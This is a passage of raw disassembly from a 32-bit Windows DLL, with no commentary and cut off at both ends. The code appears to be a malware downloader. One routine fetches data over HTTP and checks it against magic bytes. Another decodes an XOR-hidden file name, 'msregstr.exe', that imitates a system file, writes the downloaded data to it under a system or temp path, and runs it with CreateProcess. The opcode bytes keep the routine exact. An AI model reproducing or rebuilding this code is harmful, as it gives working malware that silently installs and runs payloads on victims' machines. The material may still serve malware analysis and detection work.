1000381d:	85 c0                	test   %eax,%eax
1000381f:	75 0c                	jne    0x1000382d
10003821:	c7 45 d0 a0 e4 ff ff 	movl   $0xffffe4a0,-0x30(%ebp)
10003828:	e9 f4 00 00 00       	jmp    0x10003921
1000382d:	56                   	push   %esi
1000382e:	68 00 00 00 04       	push   $0x4000000
10003833:	56                   	push   %esi
10003834:	56                   	push   %esi
10003835:	68 18 01 01 10       	push   $0x10010118
1000383a:	ff 75 e4             	push   -0x1c(%ebp)
1000383d:	68 14 01 01 10       	push   $0x10010114
10003842:	ff 75 cc             	push   -0x34(%ebp)
10003845:	ff 15 74 07 01 10    	call   *0x10010774
1000384b:	8b f8                	mov    %eax,%edi
1000384d:	89 7d e0             	mov    %edi,-0x20(%ebp)
10003850:	3b fe                	cmp    %esi,%edi
10003852:	75 0c                	jne    0x10003860
10003854:	c7 45 d0 9f e4 ff ff 	movl   $0xffffe49f,-0x30(%ebp)
1000385b:	e9 c1 00 00 00       	jmp    0x10003921
10003860:	56                   	push   %esi
10003861:	56                   	push   %esi
10003862:	56                   	push   %esi
10003863:	56                   	push   %esi
10003864:	57                   	push   %edi
10003865:	ff 15 78 07 01 10    	call   *0x10010778
1000386b:	89 45 ac             	mov    %eax,-0x54(%ebp)
1000386e:	3b c6                	cmp    %esi,%eax
10003870:	75 15                	jne    0x10003887
10003872:	ff 15 60 e1 00 10    	call   *0x1000e160
10003878:	89 45 a4             	mov    %eax,-0x5c(%ebp)
1000387b:	c7 45 d0 9e e4 ff ff 	movl   $0xffffe49e,-0x30(%ebp)
10003882:	e9 9a 00 00 00       	jmp    0x10003921
10003887:	c7 45 b8 04 00 00 00 	movl   $0x4,-0x48(%ebp)
1000388e:	89 75 c4             	mov    %esi,-0x3c(%ebp)
10003891:	56                   	push   %esi
10003892:	8d 45 b8             	lea    -0x48(%ebp),%eax
10003895:	50                   	push   %eax
10003896:	8d 45 c4             	lea    -0x3c(%ebp),%eax
10003899:	50                   	push   %eax
1000389a:	68 13 00 00 20       	push   $0x20000013
1000389f:	57                   	push   %edi
100038a0:	ff 15 7c 07 01 10    	call   *0x1001077c
100038a6:	8b 45 c4             	mov    -0x3c(%ebp),%eax
100038a9:	89 45 d0             	mov    %eax,-0x30(%ebp)
100038ac:	89 75 d4             	mov    %esi,-0x2c(%ebp)
100038af:	89 75 a8             	mov    %esi,-0x58(%ebp)
100038b2:	8d 45 a8             	lea    -0x58(%ebp),%eax
100038b5:	50                   	push   %eax
100038b6:	8d 45 d4             	lea    -0x2c(%ebp),%eax
100038b9:	50                   	push   %eax
100038ba:	57                   	push   %edi
100038bb:	e8 1e fc ff ff       	call   0x100034de
100038c0:	83 c4 0c             	add    $0xc,%esp
100038c3:	89 45 c8             	mov    %eax,-0x38(%ebp)
100038c6:	3b c6                	cmp    %esi,%eax
100038c8:	7e 57                	jle    0x10003921
100038ca:	8b 45 28             	mov    0x28(%ebp),%eax
100038cd:	89 18                	mov    %ebx,(%eax)
100038cf:	ff 75 cc             	push   -0x34(%ebp)
100038d2:	ff 15 80 07 01 10    	call   *0x10010780
100038d8:	89 75 cc             	mov    %esi,-0x34(%ebp)
100038db:	ff 75 e0             	push   -0x20(%ebp)
100038de:	ff 15 80 07 01 10    	call   *0x10010780
100038e4:	89 75 e0             	mov    %esi,-0x20(%ebp)
100038e7:	89 75 d8             	mov    %esi,-0x28(%ebp)
100038ea:	89 75 b4             	mov    %esi,-0x4c(%ebp)
100038ed:	ff 75 24             	push   0x24(%ebp)
100038f0:	8d 45 b4             	lea    -0x4c(%ebp),%eax
100038f3:	50                   	push   %eax
100038f4:	8d 45 d8             	lea    -0x28(%ebp),%eax
100038f7:	50                   	push   %eax
100038f8:	ff 75 a8             	push   -0x58(%ebp)
100038fb:	ff 75 d4             	push   -0x2c(%ebp)
100038fe:	e8 58 01 00 00       	call   0x10003a5b
10003903:	83 c4 14             	add    $0x14,%esp
10003906:	88 45 b0             	mov    %al,-0x50(%ebp)
10003909:	3a c3                	cmp    %bl,%al
1000390b:	75 14                	jne    0x10003921
1000390d:	ff 75 24             	push   0x24(%ebp)
10003910:	ff 75 20             	push   0x20(%ebp)
10003913:	ff 75 b4             	push   -0x4c(%ebp)
10003916:	ff 75 d8             	push   -0x28(%ebp)
10003919:	e8 e6 02 00 00       	call   0x10003c04
1000391e:	83 c4 10             	add    $0x10,%esp
10003921:	89 75 fc             	mov    %esi,-0x4(%ebp)
10003924:	e8 04 00 00 00       	call   0x1000392d
10003929:	eb 7b                	jmp    0x100039a6
1000392b:	33 f6                	xor    %esi,%esi
1000392d:	39 75 e4             	cmp    %esi,-0x1c(%ebp)
10003930:	74 11                	je     0x10003943
10003932:	ff 75 e4             	push   -0x1c(%ebp)
10003935:	8b 3d c8 e1 00 10    	mov    0x1000e1c8,%edi
1000393b:	ff d7                	call   *%edi
1000393d:	59                   	pop    %ecx
1000393e:	89 75 e4             	mov    %esi,-0x1c(%ebp)
10003941:	eb 06                	jmp    0x10003949
10003943:	8b 3d c8 e1 00 10    	mov    0x1000e1c8,%edi
10003949:	39 75 d4             	cmp    %esi,-0x2c(%ebp)
1000394c:	74 09                	je     0x10003957
1000394e:	ff 75 d4             	push   -0x2c(%ebp)
10003951:	ff d7                	call   *%edi
10003953:	59                   	pop    %ecx
10003954:	89 75 d4             	mov    %esi,-0x2c(%ebp)
10003957:	39 75 d8             	cmp    %esi,-0x28(%ebp)
1000395a:	74 09                	je     0x10003965
1000395c:	ff 75 d8             	push   -0x28(%ebp)
1000395f:	ff d7                	call   *%edi
10003961:	59                   	pop    %ecx
10003962:	89 75 d8             	mov    %esi,-0x28(%ebp)
10003965:	39 75 dc             	cmp    %esi,-0x24(%ebp)
10003968:	74 09                	je     0x10003973
1000396a:	ff 75 dc             	push   -0x24(%ebp)
1000396d:	ff d7                	call   *%edi
1000396f:	59                   	pop    %ecx
10003970:	89 75 dc             	mov    %esi,-0x24(%ebp)
10003973:	39 75 cc             	cmp    %esi,-0x34(%ebp)
10003976:	74 0c                	je     0x10003984
10003978:	ff 75 cc             	push   -0x34(%ebp)
1000397b:	ff 15 80 07 01 10    	call   *0x10010780
10003981:	89 75 cc             	mov    %esi,-0x34(%ebp)
10003984:	39 75 e0             	cmp    %esi,-0x20(%ebp)
10003987:	74 0c                	je     0x10003995
10003989:	ff 75 e0             	push   -0x20(%ebp)
1000398c:	ff 15 80 07 01 10    	call   *0x10010780
10003992:	89 75 e0             	mov    %esi,-0x20(%ebp)
10003995:	c3                   	ret
10003996:	eb 0e                	jmp    0x100039a6
10003998:	6a 01                	push   $0x1
1000399a:	58                   	pop    %eax
1000399b:	c3                   	ret
1000399c:	8b 65 e8             	mov    -0x18(%ebp),%esp
1000399f:	c7 45 d0 9c e4 ff ff 	movl   $0xffffe49c,-0x30(%ebp)
100039a6:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
100039aa:	8b 45 d0             	mov    -0x30(%ebp),%eax
100039ad:	8b 4d f0             	mov    -0x10(%ebp),%ecx
100039b0:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
100039b7:	5f                   	pop    %edi
100039b8:	5e                   	pop    %esi
100039b9:	5b                   	pop    %ebx
100039ba:	c9                   	leave
100039bb:	c3                   	ret
100039bc:	55                   	push   %ebp
100039bd:	8b ec                	mov    %esp,%ebp
100039bf:	6a ff                	push   $0xffffffff
100039c1:	68 d0 e2 00 10       	push   $0x1000e2d0
100039c6:	68 00 c6 00 10       	push   $0x1000c600
100039cb:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
100039d1:	50                   	push   %eax
100039d2:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
100039d9:	83 ec 0c             	sub    $0xc,%esp
100039dc:	53                   	push   %ebx
100039dd:	56                   	push   %esi
100039de:	57                   	push   %edi
100039df:	89 65 e8             	mov    %esp,-0x18(%ebp)
100039e2:	c7 45 e4 01 00 00 00 	movl   $0x1,-0x1c(%ebp)
100039e9:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
100039ed:	8b 5d 14             	mov    0x14(%ebp),%ebx
100039f0:	8b 45 1c             	mov    0x1c(%ebp),%eax
100039f3:	03 c3                	add    %ebx,%eax
100039f5:	8b 75 0c             	mov    0xc(%ebp),%esi
100039f8:	89 06                	mov    %eax,(%esi)
100039fa:	40                   	inc    %eax
100039fb:	50                   	push   %eax
100039fc:	ff 15 c0 e1 00 10    	call   *0x1000e1c0
10003a02:	59                   	pop    %ecx
10003a03:	8b 7d 08             	mov    0x8(%ebp),%edi
10003a06:	89 07                	mov    %eax,(%edi)
10003a08:	85 c0                	test   %eax,%eax
10003a0a:	74 39                	je     0x10003a45
10003a0c:	8b 0e                	mov    (%esi),%ecx
10003a0e:	41                   	inc    %ecx
10003a0f:	51                   	push   %ecx
10003a10:	6a 00                	push   $0x0
10003a12:	50                   	push   %eax
10003a13:	e8 fe 98 00 00       	call   0x1000d316
10003a18:	ff 36                	push   (%esi)
10003a1a:	ff 75 10             	push   0x10(%ebp)
10003a1d:	ff 37                	push   (%edi)
10003a1f:	ff 15 b4 e1 00 10    	call   *0x1000e1b4
10003a25:	8b 06                	mov    (%esi),%eax
10003a27:	2b c3                	sub    %ebx,%eax
10003a29:	50                   	push   %eax
10003a2a:	ff 75 18             	push   0x18(%ebp)
10003a2d:	ff 37                	push   (%edi)
10003a2f:	ff 15 cc e1 00 10    	call   *0x1000e1cc
10003a35:	83 c4 24             	add    $0x24,%esp
10003a38:	eb 0b                	jmp    0x10003a45
10003a3a:	6a 01                	push   $0x1
10003a3c:	58                   	pop    %eax
10003a3d:	c3                   	ret
10003a3e:	8b 65 e8             	mov    -0x18(%ebp),%esp
10003a41:	83 65 e4 00          	andl   $0x0,-0x1c(%ebp)
10003a45:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
10003a49:	8b 45 e4             	mov    -0x1c(%ebp),%eax
10003a4c:	8b 4d f0             	mov    -0x10(%ebp),%ecx
10003a4f:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
10003a56:	5f                   	pop    %edi
10003a57:	5e                   	pop    %esi
10003a58:	5b                   	pop    %ebx
10003a59:	c9                   	leave
10003a5a:	c3                   	ret
10003a5b:	55                   	push   %ebp
10003a5c:	8b ec                	mov    %esp,%ebp
10003a5e:	6a ff                	push   $0xffffffff
10003a60:	68 e0 e2 00 10       	push   $0x1000e2e0
10003a65:	68 00 c6 00 10       	push   $0x1000c600
10003a6a:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
10003a70:	50                   	push   %eax
10003a71:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
10003a78:	83 ec 48             	sub    $0x48,%esp
10003a7b:	53                   	push   %ebx
10003a7c:	56                   	push   %esi
10003a7d:	57                   	push   %edi
10003a7e:	89 65 e8             	mov    %esp,-0x18(%ebp)
10003a81:	33 f6                	xor    %esi,%esi
10003a83:	89 75 e4             	mov    %esi,-0x1c(%ebp)
10003a86:	c6 45 e0 01          	movb   $0x1,-0x20(%ebp)
10003a8a:	89 75 fc             	mov    %esi,-0x4(%ebp)
10003a8d:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
10003a94:	6a 06                	push   $0x6
10003a96:	58                   	pop    %eax
10003a97:	89 45 dc             	mov    %eax,-0x24(%ebp)
10003a9a:	6a 04                	push   $0x4
10003a9c:	5f                   	pop    %edi
10003a9d:	89 7d b8             	mov    %edi,-0x48(%ebp)
10003aa0:	c7 45 b0 14 00 00 00 	movl   $0x14,-0x50(%ebp)
10003aa7:	89 7d bc             	mov    %edi,-0x44(%ebp)
10003aaa:	89 7d c0             	mov    %edi,-0x40(%ebp)
10003aad:	6a 22                	push   $0x22
10003aaf:	59                   	pop    %ecx
10003ab0:	89 4d d0             	mov    %ecx,-0x30(%ebp)
10003ab3:	c7 45 ac 26 00 00 00 	movl   $0x26,-0x54(%ebp)
10003aba:	c6 45 a8 99          	movb   $0x99,-0x58(%ebp)
10003abe:	c6 45 a9 0b          	movb   $0xb,-0x57(%ebp)
10003ac2:	c6 45 aa 99          	movb   $0x99,-0x56(%ebp)
10003ac6:	c6 45 ab 12          	movb   $0x12,-0x55(%ebp)
10003aca:	89 75 b4             	mov    %esi,-0x4c(%ebp)
10003acd:	39 45 0c             	cmp    %eax,0xc(%ebp)
10003ad0:	0f 82 8d 00 00 00    	jb     0x10003b63
10003ad6:	83 7d 0c 0a          	cmpl   $0xa,0xc(%ebp)
10003ada:	0f 82 83 00 00 00    	jb     0x10003b63
10003ae0:	39 4d 0c             	cmp    %ecx,0xc(%ebp)
10003ae3:	72 7e                	jb     0x10003b63
10003ae5:	57                   	push   %edi
10003ae6:	8d 45 a8             	lea    -0x58(%ebp),%eax
10003ae9:	50                   	push   %eax
10003aea:	8b 5d 08             	mov    0x8(%ebp),%ebx
10003aed:	8d 43 06             	lea    0x6(%ebx),%eax
10003af0:	50                   	push   %eax
10003af1:	e8 c2 99 00 00       	call   0x1000d4b8
10003af6:	83 c4 0c             	add    $0xc,%esp
10003af9:	85 c0                	test   %eax,%eax
10003afb:	75 66                	jne    0x10003b63
10003afd:	57                   	push   %edi
10003afe:	83 c3 22             	add    $0x22,%ebx
10003b01:	53                   	push   %ebx
10003b02:	8d 45 b4             	lea    -0x4c(%ebp),%eax
10003b05:	50                   	push   %eax
10003b06:	e8 11 98 00 00       	call   0x1000d31c
10003b0b:	8b 45 b4             	mov    -0x4c(%ebp),%eax
10003b0e:	8b 7d 14             	mov    0x14(%ebp),%edi
10003b11:	89 07                	mov    %eax,(%edi)
10003b13:	50                   	push   %eax
10003b14:	ff 15 c0 e1 00 10    	call   *0x1000e1c0
10003b1a:	83 c4 10             	add    $0x10,%esp
10003b1d:	8b 4d 10             	mov    0x10(%ebp),%ecx
10003b20:	89 01                	mov    %eax,(%ecx)
10003b22:	85 c9                	test   %ecx,%ecx
10003b24:	74 32                	je     0x10003b58
10003b26:	ff 37                	push   (%edi)
10003b28:	56                   	push   %esi
10003b29:	50                   	push   %eax
10003b2a:	e8 e7 97 00 00       	call   0x1000d316
10003b2f:	8b 45 0c             	mov    0xc(%ebp),%eax
10003b32:	8d 58 da             	lea    -0x26(%eax),%ebx
10003b35:	89 5d d4             	mov    %ebx,-0x2c(%ebp)
10003b38:	c7 45 cc 0c 00 00 00 	movl   $0xc,-0x34(%ebp)
10003b3f:	83 c3 0c             	add    $0xc,%ebx
10003b42:	89 5d d8             	mov    %ebx,-0x28(%ebp)
10003b45:	53                   	push   %ebx
10003b46:	ff 15 c0 e1 00 10    	call   *0x1000e1c0
10003b4c:	83 c4 10             	add    $0x10,%esp
10003b4f:	8b f0                	mov    %eax,%esi
10003b51:	89 75 e4             	mov    %esi,-0x1c(%ebp)
10003b54:	85 f6                	test   %esi,%esi
10003b56:	75 1a                	jne    0x10003b72
10003b58:	ff 15 60 e1 00 10    	call   *0x1000e160
10003b5e:	8b 4d 18             	mov    0x18(%ebp),%ecx
10003b61:	89 01                	mov    %eax,(%ecx)
10003b63:	80 65 e0 00          	andb   $0x0,-0x20(%ebp)
10003b67:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
10003b6b:	e8 60 00 00 00       	call   0x10003bd0
10003b70:	eb 7c                	jmp    0x10003bee
10003b72:	53                   	push   %ebx
10003b73:	6a 00                	push   $0x0
10003b75:	56                   	push   %esi
10003b76:	e8 9b 97 00 00       	call   0x1000d316
10003b7b:	89 75 c4             	mov    %esi,-0x3c(%ebp)
10003b7e:	c6 06 40             	movb   $0x40,(%esi)
10003b81:	8b 45 0c             	mov    0xc(%ebp),%eax
10003b84:	89 46 04             	mov    %eax,0x4(%esi)
10003b87:	8b 07                	mov    (%edi),%eax
10003b89:	89 46 08             	mov    %eax,0x8(%esi)
10003b8c:	80 66 01 00          	andb   $0x0,0x1(%esi)
10003b90:	8d 43 f4             	lea    -0xc(%ebx),%eax
10003b93:	50                   	push   %eax
10003b94:	8b 45 08             	mov    0x8(%ebp),%eax
10003b97:	83 c0 26             	add    $0x26,%eax
10003b9a:	50                   	push   %eax
10003b9b:	8d 46 0c             	lea    0xc(%esi),%eax
10003b9e:	50                   	push   %eax
10003b9f:	e8 78 97 00 00       	call   0x1000d31c
10003ba4:	ff 37                	push   (%edi)
10003ba6:	8b 45 10             	mov    0x10(%ebp),%eax
10003ba9:	ff 30                	push   (%eax)
10003bab:	53                   	push   %ebx
10003bac:	56                   	push   %esi
10003bad:	e8 2e 90 00 00       	call   0x1000cbe0
10003bb2:	83 c4 28             	add    $0x28,%esp
10003bb5:	89 45 c8             	mov    %eax,-0x38(%ebp)
10003bb8:	3b 07                	cmp    (%edi),%eax
10003bba:	74 ab                	je     0x10003b67
10003bbc:	80 65 e0 00          	andb   $0x0,-0x20(%ebp)
10003bc0:	ff 15 60 e1 00 10    	call   *0x1000e160
10003bc6:	8b 4d 18             	mov    0x18(%ebp),%ecx
10003bc9:	89 01                	mov    %eax,(%ecx)
10003bcb:	eb 9a                	jmp    0x10003b67
10003bcd:	8b 75 e4             	mov    -0x1c(%ebp),%esi
10003bd0:	85 f6                	test   %esi,%esi
10003bd2:	74 0c                	je     0x10003be0
10003bd4:	56                   	push   %esi
10003bd5:	ff 15 c8 e1 00 10    	call   *0x1000e1c8
10003bdb:	59                   	pop    %ecx
10003bdc:	83 65 e4 00          	andl   $0x0,-0x1c(%ebp)
10003be0:	c3                   	ret
10003be1:	eb 0b                	jmp    0x10003bee
10003be3:	6a 01                	push   $0x1
10003be5:	58                   	pop    %eax
10003be6:	c3                   	ret
10003be7:	8b 65 e8             	mov    -0x18(%ebp),%esp
10003bea:	80 65 e0 00          	andb   $0x0,-0x20(%ebp)
10003bee:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
10003bf2:	8a 45 e0             	mov    -0x20(%ebp),%al
10003bf5:	8b 4d f0             	mov    -0x10(%ebp),%ecx
10003bf8:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
10003bff:	5f                   	pop    %edi
10003c00:	5e                   	pop    %esi
10003c01:	5b                   	pop    %ebx
10003c02:	c9                   	leave
10003c03:	c3                   	ret
10003c04:	55                   	push   %ebp
10003c05:	8b ec                	mov    %esp,%ebp
10003c07:	6a ff                	push   $0xffffffff
10003c09:	68 f8 e2 00 10       	push   $0x1000e2f8
10003c0e:	68 00 c6 00 10       	push   $0x1000c600
10003c13:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
10003c19:	50                   	push   %eax
10003c1a:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
10003c21:	81 ec 90 02 00 00    	sub    $0x290,%esp
10003c27:	53                   	push   %ebx
10003c28:	56                   	push   %esi
10003c29:	57                   	push   %edi
10003c2a:	89 65 e8             	mov    %esp,-0x18(%ebp)
10003c2d:	33 db                	xor    %ebx,%ebx
10003c2f:	88 9d c4 fe ff ff    	mov    %bl,-0x13c(%ebp)
10003c35:	89 5d e0             	mov    %ebx,-0x20(%ebp)
10003c38:	be 05 01 00 00       	mov    $0x105,%esi
10003c3d:	56                   	push   %esi
10003c3e:	53                   	push   %ebx
10003c3f:	8d 85 d8 fe ff ff    	lea    -0x128(%ebp),%eax
10003c45:	50                   	push   %eax
10003c46:	e8 cb 96 00 00       	call   0x1000d316
10003c4b:	56                   	push   %esi
10003c4c:	53                   	push   %ebx
10003c4d:	8d 85 b8 fd ff ff    	lea    -0x248(%ebp),%eax
10003c53:	50                   	push   %eax
10003c54:	e8 bd 96 00 00       	call   0x1000d316
10003c59:	83 c4 18             	add    $0x18,%esp
10003c5c:	c6 85 c8 fe ff ff 23 	movb   $0x23,-0x138(%ebp)
10003c63:	c6 85 c9 fe ff ff 12 	movb   $0x12,-0x137(%ebp)
10003c6a:	c6 85 ca fe ff ff 0c 	movb   $0xc,-0x136(%ebp)
10003c71:	c6 85 cb fe ff ff 0d 	movb   $0xd,-0x135(%ebp)
10003c78:	c6 85 cc fe ff ff 1a 	movb   $0x1a,-0x134(%ebp)
10003c7f:	c6 85 cd fe ff ff 18 	movb   $0x18,-0x133(%ebp)
10003c86:	c6 85 ce fe ff ff 0c 	movb   $0xc,-0x132(%ebp)
10003c8d:	c6 85 cf fe ff ff 0b 	movb   $0xb,-0x131(%ebp)
10003c94:	c6 85 d0 fe ff ff 0d 	movb   $0xd,-0x130(%ebp)
10003c9b:	c6 85 d1 fe ff ff 51 	movb   $0x51,-0x12f(%ebp)
10003ca2:	c6 85 d2 fe ff ff 1a 	movb   $0x1a,-0x12e(%ebp)
10003ca9:	c6 85 d3 fe ff ff 07 	movb   $0x7,-0x12d(%ebp)
10003cb0:	c6 85 d4 fe ff ff 1a 	movb   $0x1a,-0x12c(%ebp)
10003cb7:	88 9d d5 fe ff ff    	mov    %bl,-0x12b(%ebp)
10003cbd:	89 5d fc             	mov    %ebx,-0x4(%ebp)
10003cc0:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
10003cc7:	8d 85 c8 fe ff ff    	lea    -0x138(%ebp),%eax
10003ccd:	50                   	push   %eax
10003cce:	e8 1b 39 00 00       	call   0x100075ee
10003cd3:	c7 04 24 04 01 00 00 	movl   $0x104,(%esp)
10003cda:	8d 85 b8 fd ff ff    	lea    -0x248(%ebp),%eax
10003ce0:	50                   	push   %eax
10003ce1:	ff 15 a0 e0 00 10    	call   *0x1000e0a0
10003ce7:	56                   	push   %esi
10003ce8:	8d 85 b8 fd ff ff    	lea    -0x248(%ebp),%eax
10003cee:	50                   	push   %eax
10003cef:	8d 85 d8 fe ff ff    	lea    -0x128(%ebp),%eax
10003cf5:	50                   	push   %eax
10003cf6:	8b 3d b4 e1 00 10    	mov    0x1000e1b4,%edi
10003cfc:	ff d7                	call   *%edi
10003cfe:	8d 85 b8 fd ff ff    	lea    -0x248(%ebp),%eax
10003d04:	50                   	push   %eax
10003d05:	e8 56 96 00 00       	call   0x1000d360
10003d0a:	8b ce                	mov    %esi,%ecx
10003d0c:	2b c8                	sub    %eax,%ecx
10003d0e:	51                   	push   %ecx
10003d0f:	8d 85 c8 fe ff ff    	lea    -0x138(%ebp),%eax
10003d15:	50                   	push   %eax
10003d16:	8d 85 d8 fe ff ff    	lea    -0x128(%ebp),%eax
10003d1c:	50                   	push   %eax
10003d1d:	ff 15 cc e1 00 10    	call   *0x1000e1cc
10003d23:	83 c4 1c             	add    $0x1c,%esp
10003d26:	53                   	push   %ebx
10003d27:	68 80 00 00 00       	push   $0x80
10003d2c:	6a 02                	push   $0x2
10003d2e:	53                   	push   %ebx
10003d2f:	53                   	push   %ebx
10003d30:	68 00 00 00 40       	push   $0x40000000
10003d35:	8d 85 d8 fe ff ff    	lea    -0x128(%ebp),%eax
10003d3b:	50                   	push   %eax
10003d3c:	ff 15 28 e1 00 10    	call   *0x1000e128
10003d42:	89 45 e0             	mov    %eax,-0x20(%ebp)
10003d45:	3b c3                	cmp    %ebx,%eax
10003d47:	0f 85 a1 00 00 00    	jne    0x10003dee
10003d4d:	ff 15 60 e1 00 10    	call   *0x1000e160
10003d53:	8b 4d 14             	mov    0x14(%ebp),%ecx
10003d56:	89 01                	mov    %eax,(%ecx)
10003d58:	56                   	push   %esi
10003d59:	53                   	push   %ebx
10003d5a:	8d 85 d8 fe ff ff    	lea    -0x128(%ebp),%eax
10003d60:	50                   	push   %eax
10003d61:	e8 b0 95 00 00       	call   0x1000d316
10003d66:	56                   	push   %esi
10003d67:	53                   	push   %ebx
10003d68:	8d 85 b8 fd ff ff    	lea    -0x248(%ebp),%eax
10003d6e:	50                   	push   %eax
10003d6f:	e8 a2 95 00 00       	call   0x1000d316
10003d74:	83 c4 18             	add    $0x18,%esp
10003d77:	8d 85 b8 fd ff ff    	lea    -0x248(%ebp),%eax
10003d7d:	50                   	push   %eax
10003d7e:	56                   	push   %esi
10003d7f:	ff 15 9c e0 00 10    	call   *0x1000e09c
10003d85:	56                   	push   %esi
10003d86:	8d 85 b8 fd ff ff    	lea    -0x248(%ebp),%eax
10003d8c:	50                   	push   %eax
10003d8d:	8d 85 d8 fe ff ff    	lea    -0x128(%ebp),%eax
10003d93:	50                   	push   %eax
10003d94:	ff d7                	call   *%edi
10003d96:	8d 85 b8 fd ff ff    	lea    -0x248(%ebp),%eax
10003d9c:	50                   	push   %eax
10003d9d:	e8 be 95 00 00       	call   0x1000d360
10003da2:	2b f0                	sub    %eax,%esi
10003da4:	56                   	push   %esi
10003da5:	8d 85 c8 fe ff ff    	lea    -0x138(%ebp),%eax
10003dab:	50                   	push   %eax
10003dac:	8d 85 d8 fe ff ff    	lea    -0x128(%ebp),%eax
10003db2:	50                   	push   %eax
10003db3:	ff 15 cc e1 00 10    	call   *0x1000e1cc
10003db9:	83 c4 1c             	add    $0x1c,%esp
10003dbc:	53                   	push   %ebx
10003dbd:	68 80 00 00 00       	push   $0x80
10003dc2:	6a 02                	push   $0x2
10003dc4:	53                   	push   %ebx
10003dc5:	53                   	push   %ebx
10003dc6:	68 00 00 00 40       	push   $0x40000000
10003dcb:	8d 85 d8 fe ff ff    	lea    -0x128(%ebp),%eax
10003dd1:	50                   	push   %eax
10003dd2:	ff 15 28 e1 00 10    	call   *0x1000e128
10003dd8:	89 45 e0             	mov    %eax,-0x20(%ebp)
10003ddb:	3b c3                	cmp    %ebx,%eax
10003ddd:	0f 84 9e 00 00 00    	je     0x10003e81
10003de3:	8b 45 10             	mov    0x10(%ebp),%eax
10003de6:	c7 00 c8 00 00 00    	movl   $0xc8,(%eax)
10003dec:	eb 09                	jmp    0x10003df7
10003dee:	8b 45 10             	mov    0x10(%ebp),%eax
10003df1:	c7 00 64 00 00 00    	movl   $0x64,(%eax)
10003df7:	89 9d 60 fd ff ff    	mov    %ebx,-0x2a0(%ebp)
10003dfd:	53                   	push   %ebx
10003dfe:	8d 85 60 fd ff ff    	lea    -0x2a0(%ebp),%eax
10003e04:	50                   	push   %eax
10003e05:	ff 75 0c             	push   0xc(%ebp)
10003e08:	ff 75 08             	push   0x8(%ebp)
10003e0b:	ff 75 e0             	push   -0x20(%ebp)
10003e0e:	ff 15 2c e1 00 10    	call   *0x1000e12c
10003e14:	85 c0                	test   %eax,%eax
10003e16:	74 69                	je     0x10003e81
10003e18:	ff 75 e0             	push   -0x20(%ebp)
10003e1b:	ff 15 30 e1 00 10    	call   *0x1000e130
10003e21:	89 5d e0             	mov    %ebx,-0x20(%ebp)
10003e24:	6a 44                	push   $0x44
10003e26:	5e                   	pop    %esi
10003e27:	56                   	push   %esi
10003e28:	53                   	push   %ebx
10003e29:	8d 85 74 fd ff ff    	lea    -0x28c(%ebp),%eax
10003e2f:	50                   	push   %eax
10003e30:	e8 e1 94 00 00       	call   0x1000d316
10003e35:	83 c4 0c             	add    $0xc,%esp
10003e38:	89 b5 74 fd ff ff    	mov    %esi,-0x28c(%ebp)
10003e3e:	89 9d 80 fd ff ff    	mov    %ebx,-0x280(%ebp)
10003e44:	c7 85 a0 fd ff ff 81 	movl   $0x81,-0x260(%ebp)
10003e4b:	00 00 00 
10003e4e:	66 89 9d a4 fd ff ff 	mov    %bx,-0x25c(%ebp)
10003e55:	8d 85 64 fd ff ff    	lea    -0x29c(%ebp),%eax
10003e5b:	50                   	push   %eax
10003e5c:	8d 85 74 fd ff ff    	lea    -0x28c(%ebp),%eax
10003e62:	50                   	push   %eax
10003e63:	8d 85 b8 fd ff ff    	lea    -0x248(%ebp),%eax
10003e69:	50                   	push   %eax
10003e6a:	53                   	push   %ebx
10003e6b:	53                   	push   %ebx
10003e6c:	53                   	push   %ebx
10003e6d:	53                   	push   %ebx
10003e6e:	53                   	push   %ebx
10003e6f:	53                   	push   %ebx
10003e70:	8d 85 d8 fe ff ff    	lea    -0x128(%ebp),%eax
10003e76:	50                   	push   %eax
10003e77:	ff 15 3c e1 00 10    	call   *0x1000e13c
10003e7d:	85 c0                	test   %eax,%eax
10003e7f:	75 0d                	jne    0x10003e8e
10003e81:	ff 15 60 e1 00 10    	call   *0x1000e160
10003e87:	8b 4d 14             	mov    0x14(%ebp),%ecx
10003e8a:	89 01                	mov    %eax,(%ecx)
10003e8c:	eb 12                	jmp    0x10003ea0
10003e8e:	68 d0 07 00 00       	push   $0x7d0
10003e93:	ff 15 24 e1 00 10    	call   *0x1000e124
10003e99:	c6 85 c4 fe ff ff 01 	movb   $0x1,-0x13c(%ebp)
10003ea0:	89 5d fc             	mov    %ebx,-0x4(%ebp)
10003ea3:	e8 04 00 00 00       	call   0x10003eac
10003ea8:	eb 18                	jmp    0x10003ec2
10003eaa:	33 db                	xor    %ebx,%ebx
10003eac:	ff 75 e0             	push   -0x20(%ebp)
10003eaf:	ff 15 30 e1 00 10    	call   *0x1000e130
10003eb5:	89 5d e0             	mov    %ebx,-0x20(%ebp)
10003eb8:	c3                   	ret
10003eb9:	eb 07                	jmp    0x10003ec2
10003ebb:	6a 01                	push   $0x1
10003ebd:	58                   	pop    %eax
10003ebe:	c3                   	ret
10003ebf:	8b 65 e8             	mov    -0x18(%ebp),%esp
10003ec2:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
10003ec6:	8a 85 c4 fe ff ff    	mov    -0x13c(%ebp),%al
10003ecc:	8b 4d f0             	mov    -0x10(%ebp),%ecx
10003ecf:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
10003ed6:	5f                   	pop    %edi
10003ed7:	5e                   	pop    %esi
10003ed8:	5b                   	pop    %ebx
10003ed9:	c9                   	leave
10003eda:	c3                   	ret
10003edb:	55                   	push   %ebp
10003edc:	8b ec                	mov    %esp,%ebp
10003ede:	6a ff                	push   $0xffffffff
10003ee0:	68 10 e3 00 10       	push   $0x1000e310
10003ee5:	68 00 c6 00 10       	push   $0x1000c600
